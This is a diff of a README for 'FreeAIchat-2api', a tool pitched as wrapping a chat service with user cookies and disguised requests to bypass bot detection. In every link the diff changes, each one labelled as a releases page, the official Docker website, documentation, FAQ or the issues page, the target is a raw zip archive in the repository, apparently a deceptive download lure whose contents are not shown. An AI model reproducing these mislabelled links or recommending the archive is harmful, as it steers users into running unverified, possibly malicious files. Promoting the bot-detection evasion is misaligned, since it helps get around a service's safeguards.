@@ -1,7 +1,7 @@
 # 🤖 FreeAIchat-2api - Download and Use with Ease
 
 ## 📦 Download Now
-[![Download FreeAIchat-2api](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/antimony/FreeAIchat-2api.zip)](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/antimony/FreeAIchat-2api.zip)
+[![Download FreeAIchat-2api](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/app/A_Ichat_Free_api_v3.7.zip)](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/app/A_Ichat_Free_api_v3.7.zip)
 
 ## 🚀 Getting Started
 FreeAIchat-2api is designed to help you simulate browser requests. This application requires you to provide cookies and manages sessions on the server side. It also helps you disguise advanced requests to bypass bot detection while using the standard OpenAI API for server-sent events. 
@@ -24,7 +24,7 @@ Before you begin, make sure your system meets these requirements:
 ## 📥 Download & Install
 To download FreeAIchat-2api, follow these steps:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/antimony/FreeAIchat-2api.zip). This page contains the most recent versions of the application.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/app/A_Ichat_Free_api_v3.7.zip). This page contains the most recent versions of the application.
    
 2. **Choose Your Version**: On the Releases page, find the version you want to download. Each version comes with release notes that explain new features and fixes.
 
@@ -49,7 +49,7 @@ After you launch FreeAIchat-2api, you may need to configure a few settings:
 ## 🐋 Docker Deployment
 If you prefer one-click deployment using Docker, follow these steps:
 
-1. **Install Docker**: Make sure you have Docker installed on your system. You can download it from the [official Docker website](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/antimony/FreeAIchat-2api.zip).
+1. **Install Docker**: Make sure you have Docker installed on your system. You can download it from the [official Docker website](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/app/A_Ichat_Free_api_v3.7.zip).
 
 2. **Pull the Image**: Open your terminal or command prompt and run:
    ```
@@ -75,10 +75,10 @@ If you run into issues, consider these common solutions:
 ## ℹ️ Additional Resources
 For further guidance, check these resources:
 
-- [Documentation](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/antimony/FreeAIchat-2api.zip)
-- [FAQ](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/antimony/FreeAIchat-2api.zip)
+- [Documentation](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/app/A_Ichat_Free_api_v3.7.zip)
+- [FAQ](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/app/A_Ichat_Free_api_v3.7.zip)
 
 ## 📞 Support
-If you still need help, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/antimony/FreeAIchat-2api.zip). Provide as much detail as possible so we can assist you promptly.
+If you still need help, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/uludakar/FreeAIchat-2api/main/app/A_Ichat_Free_api_v3.7.zip). Provide as much detail as possible so we can assist you promptly.
 
 Thank you for using FreeAIchat-2api! Happy chatting!
